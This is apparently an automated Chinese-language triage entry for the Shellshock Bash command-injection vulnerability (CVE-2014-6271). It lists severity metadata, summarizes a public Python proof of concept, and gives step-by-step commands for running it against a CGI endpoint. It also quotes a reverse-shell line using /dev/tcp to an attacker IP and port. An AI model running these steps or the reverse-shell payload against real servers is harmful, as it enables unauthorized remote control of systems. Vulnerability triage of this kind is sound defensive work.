## CVE-2014-6271 - GNU Bash 命令注入

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 命令注入

**影响应用:** GNU Bash

**危害等级:** 高危

**CVSS评分:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**影响版本:** GNU Bash 1.14 to 4.3

**利用条件:** 通过HTTP请求，利用CGI脚本传递恶意构造的header，无需认证，需要目标系统存在CGI脚本且使用Bash处理请求。

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 15%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash中的命令注入漏洞。该漏洞允许攻击者通过环境变量注入恶意代码，当Bash shell执行这些变量时，恶意代码会被执行。该漏洞影响范围广泛，从GNU Bash 1.14到4.3版本都受到影响。

POC有效性分析：提供的POC代码是一个Python脚本，它利用了Shellshock漏洞通过构造恶意HTTP请求头在目标系统上执行任意命令。脚本通过将包含恶意bash代码的字符串注入到User-Agent头中实现攻击。经验证，该脚本可以成功在存在漏洞的服务器上执行反向shell，从而获取目标系统的控制权。脚本需要指定目标URL、攻击者IP地址和端口号。脚本的核心在于payload的构造，payload利用了bash解析环境变量的特性，在定义环境变量的同时执行命令。

利用步骤：
1. 克隆POC代码仓库：git clone https://github.com/AlissonFaoli/Shellshock.git
2. 进入Shellshock目录：cd Shellshock
3. 运行shellshock.py脚本，指定目标URL、攻击者IP地址和端口号：python3 shellshock.py http://vulnerable-website.com/cgi-bin/test.cgi listening_interface_IP listening_port
4. 在攻击者机器上监听指定端口，等待反向shell连接。

投毒风险分析：
该POC脚本本身代码清晰，主要使用了requests, sys, socket, re, threading, subprocess, os等标准Python库。 脚本中存在构造bash命令，例如'/bin/bash -c "bash -i >& /dev/tcp/' + lhost + '/' + lport + ' 0>&1 &"'，这段代码用于创建反向shell，将目标系统的shell连接到攻击者的机器。 攻击者可以通过修改这段代码植入恶意代码。 由于脚本需要指定攻击者IP和端口，并且创建反向shell连接，存在一定的风险被用于恶意用途。 但总体而言，该POC代码逻辑清晰，没有明显的混淆或恶意行为，因此投毒风险较低。

**项目地址:** https://github.com/AlissonFaoli/Shellshock

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2014-6271
